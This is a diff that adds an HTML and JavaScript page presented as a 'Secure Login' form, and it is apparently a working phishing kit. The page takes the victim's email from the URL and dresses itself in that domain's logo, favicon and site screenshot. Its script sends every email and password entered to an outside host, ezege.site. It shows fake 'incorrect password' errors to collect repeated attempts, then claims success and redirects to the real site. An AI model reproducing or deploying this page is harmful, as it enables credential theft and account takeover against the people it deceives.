@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Domain Login Form</title>
+    <link id="favicon" rel="icon" href="">
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f4f4;
+            background-size: 100% auto;
+            background-position: center top;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-form {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 20px 30px;
+            border-radius: 0;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+            width: 340px;
+            text-align: center;
+            border: 1px solid #c0c0c0;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 10px;
+            display: none;
+            object-fit: contain;
+            border-radius: 0;
+            background: white;
+            padding: 3px;
+            border: 1px solid #d0d0d0;
+        }
+
+        h2 {
+            margin: 0 0 20px 0;
+            font-size: 16px;
+            color: #2c3e50;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            margin-bottom: 3px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px 10px;
+            font-size: 13px;
+            border: 1px solid #b0b0b0;
+            border-radius: 0;
+            box-sizing: border-box;
+            background: #fcfcfc;
+            transition: border 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #2980b9;
+            background: white;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 2px;
+            text-align: right;
+            font-size: 10px;
+            color: #2980b9;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #1c5d87;
+        }
+
+        button {
+            width: 100%;
+            padding: 9px;
+            margin-top: 8px;
+            background: #2980b9;
+            color: white;
+            border: none;
+            border-radius: 0;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1c5d87;
+        }
+
+        .secure-note {
+            margin-top: 12px;
+            padding: 10px;
+            font-size: 9px;
+            color: #666;
+            background: #f5f5f5;
+            border-radius: 0;
+            border: 1px solid #ddd;
+            line-height: 1.3;
+        }
+
+        .secure-note .tick {
+            color: #27ae60;
+            margin-right: 3px;
+            font-size: 10px;
+        }
+
+        .location-info {
+            margin-top: 6px;
+            font-size: 8px;
+            color: #777;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 5px;
+        }
+
+        .location-flag {
+            font-size: 12px;
+            margin-right: 3px;
+        }
+
+        .ip-display {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 8px;
+            color: #555;
+        }
+
+        .compact-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            gap: 6px;
+        }
+        
+        .compact-title {
+            font-size: 14px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+        
+        .domain-badge {
+            background: #e8e8e8;
+            padding: 4px 8px;
+            border-radius: 0;
+            font-size: 10px;
+            color: #2c3e50;
+            font-weight: 500;
+            border: 1px solid #c8c8c8;
+        }
+        
+        .inline-error {
+            color: #e74c3c;
+            font-weight: 600;
+            font-size: 11px;
+            margin: 3px 0 0 0;
+            padding: 2px 0;
+            text-align: center;
+            min-height: 16px;
+        }
+
+        .success-message {
+            color: #27ae60;
+            font-weight: 600;
+            font-size: 11px;
+            margin: 3px 0 0 0;
+            padding: 2px 0;
+            text-align: center;
+            min-height: 16px;
+            display: none;
+        }
+
+        .duplicate-message {
+            color: #ff9800;
+            font-weight: 600;
+            font-size: 11px;
+            margin: 3px 0 0 0;
+            padding: 2px 0;
+            text-align: center;
+            min-height: 16px;
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            text-align: center;
+            margin: 5px 0;
+            color: #2980b9;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <form class="login-form" id="loginForm">
+        <div class="compact-header">
+            <img id="logo" class="logo" alt="Logo" style="display: none;">
+            <div>
+                <div class="compact-title" id="domainHeading">SECURE LOGIN</div>
+                <div class="domain-badge" id="domainBadge" style="display: none;">DOMAIN</div>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="email" id="emailLabel">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="Enter email address" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter password" required>
+            <a href="#" class="forgot-password" id="forgotPassword">Forgot Password?</a>
+        </div>
+        
+        <div class="inline-error" id="error-msg"></div>
+        <div class="success-message" id="success-msg">Login successful! Redirecting...</div>
+        <div class="duplicate-message" id="duplicate-msg">Password already tried</div>
+        <div class="spinner" id="spinner">Loading...</div>
+        
+        <button type="button" id="login-btn">Sign In</button>
+        
+        <div class="secure-note" id="secureNote">
+            <div>
+                <span class="tick">✓</span> <span id="secureText">Secure connection • Information protected</span>
+            </div>
+            <div class="location-info">
+                <div>
+                    <span class="location-flag" id="locationFlag">📍</span>
+                    <span id="locationText">Detecting location...</span>
+                </div>
+                <div class="ip-display" id="ipDisplay">IP: ...</div>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        let attemptCount = 0;
+        let previousPassword = '';
+
+        // GUARANTEED TRANSLATION FUNCTION
+        function translateForm(countryCode) {
+            console.log("TRANSLATE FUNCTION CALLED WITH COUNTRY:", countryCode);
+            
+            const languageMap = {
+                'ES': 'es', 'MX': 'es', 'AR': 'es',
+                'FR': 'fr', 'DE': 'de', 'IT': 'it',
+                'JP': 'ja', 'CN': 'zh', 'RU': 'ru',
+                'BR': 'pt', 'KR': 'ko'
+            };
+            
+            const langCode = languageMap[countryCode] || 'en';
+            console.log("SELECTED LANGUAGE CODE:", langCode);
+            
+            const translations = {
+                en: {
+                    title: "SECURE LOGIN",
+                    emailLabel: "Email Address",
+                    emailPlaceholder: "Enter email address",
+                    passwordLabel: "Password",
+                    passwordPlaceholder: "Enter password",
+                    forgotPassword: "Forgot Password?",
+                    loginButton: "Sign In",
+                    secureText: "Secure connection • Information protected",
+                    errorEmpty: "Please enter both email and password.",
+                    errorIncorrect: "Incorrect password. Please try again."
+                },
+                es: {
+                    title: "INICIO DE SESIÓN SEGURO",
+                    emailLabel: "Correo Electrónico",
+                    emailPlaceholder: "Ingrese su correo electrónico",
+                    passwordLabel: "Contraseña",
+                    passwordPlaceholder: "Ingrese su contraseña",
+                    forgotPassword: "¿Olvidó su contraseña?",
+                    loginButton: "Iniciar Sesión",
+                    secureText: "Conexión segura • Información protegida",
+                    errorEmpty: "Por favor ingrese correo y contraseña.",
+                    errorIncorrect: "Contraseña incorrecta. Intente de nuevo."
+                },
+                fr: {
+                    title: "CONNEXION SÉCURISÉE",
+                    emailLabel: "Adresse Email",
+                    emailPlaceholder: "Entrez votre adresse email",
+                    passwordLabel: "Mot de Passe",
+                    passwordPlaceholder: "Entrez votre mot de passe",
+                    forgotPassword: "Mot de passe oublié?",
+                    loginButton: "Se Connecter",
+                    secureText: "Connexión sécurisée • Information protégée",
+                    errorEmpty: "Veuillez entrer email et mot de passe.",
+                    errorIncorrect: "Mot de passe incorrect. Réessayez."
+                },
+                de: {
+                    title: "SICHERER LOGIN",
+                    emailLabel: "E-Mail-Adresse",
+                    emailPlaceholder: "E-Mail-Adresse eingeben",
+                    passwordLabel: "Passwort",
+                    passwordPlaceholder: "Passwort eingeben",
+                    forgotPassword: "Passwort vergessen?",
+                    loginButton: "Anmelden",
+                    secureText: "Sichere Verbindung • Informationen geschützt",
+                    errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
+                    errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut."
+                },
+                zh: {
+                    title: "安全登录",
+                    emailLabel: "电子邮件地址",
+                    emailPlaceholder: "输入电子邮件地址",
+                    passwordLabel: "密码",
+                    passwordPlaceholder: "输入密码",
+                    forgotPassword: "忘记密码？",
+                    loginButton: "登录",
+                    secureText: "安全连接 • 信息受保护",
+                    errorEmpty: "请输入电子邮件和密码。",
+                    errorIncorrect: "密码不正确。请重试。"
+                },
+                ja: {
+                    title: "安全ログイン",
+                    emailLabel: "メールアドレス",
+                    emailPlaceholder: "メールアドレスを入力",
+                    passwordLabel: "パスワード",
+                    passwordPlaceholder: "パスワードを入力",
+                    forgotPassword: "パスワードをお忘れですか？",
+                    loginButton: "ログイン",
+                    secureText: "安全な接続 • 情報保護済み",
+                    errorEmpty: "メールアドレスとパスワードを入力してください。",
+                    errorIncorrect: "パスワードが正しくありません。もう一度お試しください。"
+                },
+                ru: {
+                    title: "БЕЗОПАСНЫЙ ВХОД",
+                    emailLabel: "Адрес электронной почты",
+                    emailPlaceholder: "Введите адрес электронной почты",
+                    passwordLabel: "Пароль",
+                    passwordPlaceholder: "Введите пароль",
+                    forgotPassword: "Забыли пароль?",
+                    loginButton: "Войти",
+                    secureText: "Безопасное соединение • Информация защищена",
+                    errorEmpty: "Пожалуйста, введите email и пароль.",
+                    errorIncorrect: "Неверный пароль. Попробуйте снова."
+                }
+            };
+            
+            const lang = translations[langCode] || translations.en;
+            window.currentLanguage = langCode;
+            
+            document.getElementById('domainHeading').textContent = lang.title;
+            document.getElementById('emailLabel').textContent = lang.emailLabel;
+            document.getElementById('email').placeholder = lang.emailPlaceholder;
+            document.getElementById('passwordLabel').textContent = lang.passwordLabel;
+            document.getElementById('password').placeholder = lang.passwordPlaceholder;
+            document.getElementById('forgotPassword').textContent = lang.forgotPassword;
+            document.getElementById('login-btn').textContent = lang.loginButton;
+            document.getElementById('secureText').textContent = lang.secureText;
+            
+            console.log("TRANSLATION COMPLETE TO:", langCode);
+        }
+
+        // FOOLPROOF LOCATION DETECTION
+        async function detectLocationAndTranslate() {
+            console.log("=== STARTING LOCATION DETECTION ===");
+            
+            try {
+                const response1 = await fetch('https://ipinfo.io/json');
+                const data1 = await response1.json();
+                
+                if (data1 && data1.country) {
+                    console.log("Success from ipinfo.io!");
+                    console.log("Country:", data1.country);
+                    console.log("IP:", data1.ip);
+                    console.log("City:", data1.city);
+                    
+                    const flags = {'US':'🇺🇸','ES':'🇪🇸','FR':'🇫🇷','DE':'🇩🇪','IT':'🇮🇹','JP':'🇯🇵','CN':'🇨🇳','RU':'🇷🇺','BR':'🇧🇷','KR':'🇰🇷'};
+                    document.getElementById('locationFlag').textContent = flags[data1.country] || '📍';
+                    document.getElementById('locationText').textContent = `${data1.city || 'Unknown'}, ${data1.country}`;
+                    document.getElementById('ipDisplay').textContent = `IP: ${data1.ip}`;
+                    
+                    translateForm(data1.country);
+                    return;
+                }
+            } catch (error) {
+                console.log("ipinfo.io failed:", error.message);
+            }
+            
+            try {
+                const response2 = await fetch('https://ipapi.co/json/');
+                const data2 = await response2.json();
+                
+                if (data2 && data2.country_code) {
+                    console.log("Success from ipapi.co!");
+                    console.log("Country:", data2.country_code);
+                    console.log("IP:", data2.ip);
+                    
+                    const flags = {'US':'🇺🇸','ES':'🇪🇸','FR':'🇫🇷','DE':'🇩🇪','IT':'🇮🇹','JP':'🇯🇵','CN':'🇨🇳','RU':'🇷🇺'};
+                    document.getElementById('locationFlag').textContent = flags[data2.country_code] || '📍';
+                    document.getElementById('locationText').textContent = `${data2.city || 'Unknown'}, ${data2.country_name || data2.country_code}`;
+                    document.getElementById('ipDisplay').textContent = `IP: ${data2.ip}`;
+                    
+                    translateForm(data2.country_code);
+                    return;
+                }
+            } catch (error) {
+                console.log("ipapi.co failed:", error.message);
+            }
+            
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                if (ipData && ipData.ip) {
+                    console.log("Got IP:", ipData.ip);
+                    
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/country/`);
+                    const country = await geoResponse.text();
+                    
+                    if (country && country.trim().length === 2) {
+                        console.log("Got country from IP:", country.trim());
+                        translateForm(country.trim());
+                    }
+                    
+                    document.getElementById('ipDisplay').textContent = `IP: ${ipData.ip}`;
+                    document.getElementById('locationText').textContent = "Location detected";
+                }
+            } catch (error) {
+                console.log("Combined method failed:", error.message);
+            }
+            
+            console.log("All methods failed, using default");
+            document.getElementById('locationText').textContent = "Online";
+            document.getElementById('ipDisplay').textContent = "IP: Active";
+            translateForm('en');
+        }
+
+        // Process URL hash for domain customization
+        const hash = decodeURIComponent(window.location.hash.substring(1));
+        
+        if (hash) {
+            const emailInput = document.getElementById('email');
+            emailInput.value = hash;
+            
+            const atIndex = hash.indexOf('@');
+            if (atIndex !== -1) {
+                const fullDomain = hash.substring(atIndex + 1);
+                const rootDomain = fullDomain.split('.')[0];
+                const logo = document.getElementById('logo');
+                const domainBadge = document.getElementById('domainBadge');
+                const domainHeading = document.getElementById('domainHeading');
+                
+                const logoUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://logo.clearbit.com/${fullDomain}?size=256`)}`;
+                
+                logo.src = logoUrl;
+                logo.style.display = 'block';
+                
+                document.getElementById('favicon').href = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
+                
+                domainHeading.textContent = rootDomain.toUpperCase();
+                domainBadge.textContent = fullDomain;
+                domainBadge.style.display = 'block';
+                
+                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
+                
+                document.getElementById('secureNote').innerHTML = `<span class="tick">✓</span> Verified Secure • ${rootDomain.toUpperCase()} Inc. ©2026`;
+                
+                logo.onerror = function() {
+                    logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
+                    logo.onerror = function() {
+                        logo.style.display = 'none';
+                    };
+                };
+            }
+        }
+
+        // START DETECTION IMMEDIATELY
+        window.addEventListener('load', function() {
+            console.log("=== PAGE LOADED ===");
+            detectLocationAndTranslate();
+        });
+
+        detectLocationAndTranslate();
+
+        // Login functionality
+        const loginBtn = document.getElementById('login-btn');
+        const errorMsg = document.getElementById('error-msg');
+        const successMsg = document.getElementById('success-msg');
+        const duplicateMsg = document.getElementById('duplicate-msg');
+        const spinner = document.getElementById('spinner');
+        
+        loginBtn.addEventListener('click', handleLogin);
+        
+        function handleLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            duplicateMsg.style.display = 'none';
+            spinner.style.display = 'none';
+            
+            if (!email || !password) {
+                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorEmpty;
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            if (password === previousPassword) {
+                duplicateMsg.style.display = 'block';
+                setTimeout(function() {
+                    duplicateMsg.style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            previousPassword = password;
+            spinner.style.display = 'block';
+            
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            
+            fetch('https://ezege.site/b/a.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => {
+                console.log('Logging attempt');
+            });
+            
+            attemptCount++;
+            document.getElementById('password').value = '';
+            
+            if (attemptCount < 3) {
+                spinner.style.display = 'none';
+                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorIncorrect;
+                errorMsg.style.display = 'block';
+                setTimeout(function() {
+                    errorMsg.style.display = 'none';
+                }, 3000);
+            } else {
+                spinner.style.display = 'none';
+                const domain = email.split('@')[1] || 'outlook.com';
+                successMsg.style.display = 'block';
+                setTimeout(() => {
+                    window.location.href = `https://${domain}`;
+                }, 1000);
+            }
+        }
+        
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+    </script>
+</body>
+</html>
